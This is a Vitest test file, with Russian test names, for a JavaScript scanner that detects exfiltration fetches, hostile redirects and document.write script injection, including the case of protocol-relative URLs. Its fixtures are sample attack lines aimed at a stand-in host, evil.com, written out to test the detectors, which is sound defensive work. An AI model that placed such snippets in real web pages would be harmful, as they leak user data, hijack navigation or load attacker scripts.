import { describe, it, expect } from 'vitest';
import { parseJs } from '../../ast/parse.js';
import { isExternalUrl } from '../helpers.js';
import { detectExfilCalls } from '../detect-exfil-calls.js';
import { detectRedirect } from '../detect-redirect.js';
import { detectDocWriteScript } from '../detect-document-write-script.js';
import type { DetectorContext } from '../../ast/types.js';

const MAIN = 'mysite.com';
function ctx(source: string): DetectorContext {
  return { source, relPath: 'test.js', mainHost: MAIN };
}

describe('isExternalUrl — единый, с обработкой // (DET-3)', () => {
  it('протокол-относительный //host → внешний', () => {
    expect(isExternalUrl('//evil.com/steal', MAIN)).toBe(true);
  });
  it('абсолютный https://other → внешний', () => {
    expect(isExternalUrl('https://evil.attacker.net/x', MAIN)).toBe(true);
  });
  it('wss://other → внешний', () => {
    expect(isExternalUrl('wss://evil.com/sock', MAIN)).toBe(true);
  });
  it('относительный путь → НЕ внешний', () => {
    expect(isExternalUrl('analytics.js', MAIN)).toBe(false);
    expect(isExternalUrl('/api/track', MAIN)).toBe(false);
  });
  it('свой хост (и поддомен) → НЕ внешний', () => {
    expect(isExternalUrl(`https://${MAIN}/api`, MAIN)).toBe(false);
    expect(isExternalUrl(`//cdn.${MAIN}/x`, MAIN)).toBe(false);
  });
  it('пустой mainHost: относительный всё равно НЕ внешний (нет FP)', () => {
    expect(isExternalUrl('analytics.js', '')).toBe(false);
    expect(isExternalUrl('//evil.com/x', '')).toBe(true);
  });
});

describe('детекторы ловят протокол-относительный //host (DET-3)', () => {
  it('fetch("//evil.com") детектится как exfil', () => {
    // Чистый литерал — изолируем DET-3 (// в URL). Конкатенация/переменная — это DET-1.
    const src = `fetch('//evil.com/steal')`;
    const ast = parseJs(src, 'test.js')!;
    const res = detectExfilCalls(ast, ctx(src));
    expect(res.some((r) => r.threatType === 'exfil-fetch')).toBe(true);
  });

  it('location.href="//evil.com" детектится как redirect', () => {
    const src = `location.href = '//evil.com/offer'`;
    const ast = parseJs(src, 'test.js')!;
    const res = detectRedirect(ast, ctx(src));
    expect(res.some((r) => r.threatType === 'redirect')).toBe(true);
  });

  it('document.write("<script src=//evil>") детектится', () => {
    const src = `document.write('<script src="//evil.com/inject.js"></script>')`;
    const ast = parseJs(src, 'test.js')!;
    const res = detectDocWriteScript(ast, ctx(src));
    expect(res.some((r) => r.threatType === 'exfil-document-write')).toBe(true);
  });

  it('НЕ-РЕГРЕСС: fetch на свой хост не детектится', () => {
    const src = `fetch('/api/local')`;
    const ast = parseJs(src, 'test.js')!;
    const res = detectExfilCalls(ast, ctx(src));
    expect(res.some((r) => r.threatType === 'exfil-fetch')).toBe(false);
  });
});
